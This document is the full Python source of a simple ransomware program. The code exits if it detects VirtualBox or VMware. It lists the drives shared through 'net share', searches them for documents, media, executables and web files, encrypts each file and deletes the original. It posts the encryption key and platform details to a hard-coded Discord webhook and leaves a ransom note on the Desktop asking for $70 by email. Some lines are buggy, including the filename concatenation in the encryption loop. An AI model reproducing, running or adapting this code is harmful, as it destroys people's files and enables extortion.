# import modules
import os
#subprocess for command by matin nouriyan
import subprocess 
#cryptography for encode and generate key
from cryptography.fernet import Fernet
#exit for virtual envirment
from sys import exit
#for send key 
import requests
#w process
from multiprocessing import Process
#detect platform
import platform
import time










key = Fernet.generate_key()
platf = platform.platform()
encrypt = Fernet(key)



# list of all driver table
Drivers = ["A:", "B:","Q:","W:","S:","E:","D:","R:","T:","Y:","U:","I:","O:", "P:", "F:","G:","H:", "J:", "K:", "L:","Z:","X:","V:","N:","M:"]


#list for adding available drive
active_D = []


#change directory for Coordination with script
try:
    os.chdir("C:")
except:
    pass
passwand = ["mov", "jpg", "pdf", "mp4","jpeg","png", "mp3", "rar", "exe", "js", "html", "php" , "doc", "xml" , "txt"]

def DetectWin():
    #detect virtualbox or vmware
    cmd = subprocess.getoutput("SYSTEMINFO")
    cmd2 = cmd
    if "VirtualBox" in cmd2 or "VMware" in cmd2:
        file = open("hi.txt","w+")
        file.write("hello :) i love you ")
        file.close()
        exit()



#find and add to active list 
def find_drive():
    net_share = subprocess.check_output("net share",shell=True)
    for i in Drivers:
        if i in net_share.decode():
            active_D.append(i)
    return active_D

#find all file with dir by matin nouriyan 
def find_file(drivers):
    #create file to write informations
    f = open("files.txt", "a+")
    # c drive
    for i in passwand:
        try:
            cmsa = subprocess.check_output("cd / && dir /s /b *."+i,shell=True) 
            f.writelines(cmsa.decode())
            
        except:
            pass
    #other drives
    for d in drivers:
        for p in passwand:
            try:
                cmd_dir = subprocess.check_output(d+" && dir /s /b *."+p,shell=True)
                f.writelines(cmd_dir.decode())
                # print(p+ " has find")
            except:
                
                pass
    f.close()

def encfile():

    file = open("files.txt", "r")
    file_read = file.readlines()
    for path in file_read:
        try:
            #open file founded and encrypt and delete orginal file
            path = path.strip("\n")
            path = path.strip("\r")
            file2 = open(path, "rb")
            info = file2.read()
            encrtpt_file = encrypt.encrypt(info)
            file3 = open(path+["enc"], "wb+")
            file3.write(encrtpt_file)
            file2.close()
            file3.close()
            os.remove(path)
        except:
            pass
    file.close()




def notep():
    msg = """
    all file has ben encrypted 
    tell me to give decrypt key
    give me 70$ to send your key
    my email : matinnoryan@gmail.com
    """
    desk = os.path.expanduser("~"+"\\Desktop")
    file = open(desk+'hack.txt',"w+")
    file.write(msg)
    file.close()









# run all functions for encryption
def runsam():
    DetectWin()
    drv = find_drive()
    # detect vmware or virtual box
    payload = {"username:": "Bot", "content" : str(key)+" "+platf}
    #webhook discord url 
    #send key to discord me you can set your url in down line url=
    requests.post(url="https://discord.com/api/webhooks/871376500606246982/wUjPZjXLfWTaPKM31ItRK7WS-CUnHzUDrIZF66E7VUMCCfaEMA-5naH-l2Eh6sZ7ZYtv",data= payload)

    #free memory
    Drivers.clear()
    #find all file with enable drive
    find_file(drv)
    # #encrypt
    encfile()
    
    



#w processing 
if __name__ == "__main__":
    pr1 = Process(name="samw", target=runsam)
    pr1.start()
    time.sleep(15)
    pr2 = Process(name="senkey",target=notep)
    pr2.start()


    
